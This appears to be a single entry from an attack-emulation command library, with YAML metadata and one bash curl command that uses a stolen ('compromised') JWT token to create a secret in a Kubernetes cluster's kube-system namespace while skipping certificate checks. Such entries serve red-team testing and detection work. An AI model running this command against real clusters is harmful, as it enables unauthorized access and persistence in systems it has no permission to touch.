---
id: b826bebd-7839-407c-94fa-fcbb1d1df1c9
name: Create Secret in kube-system Namespace
type: command
executor: bash
data: 'curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>" -H "Content-Type:
  application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret'
output: null
created_at: '2023-04-06T03:56:01.304901+00:00'
updated_at: '2023-04-10T20:34:00.645334+00:00'
---

# Create Secret in kube-system Namespace

```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```


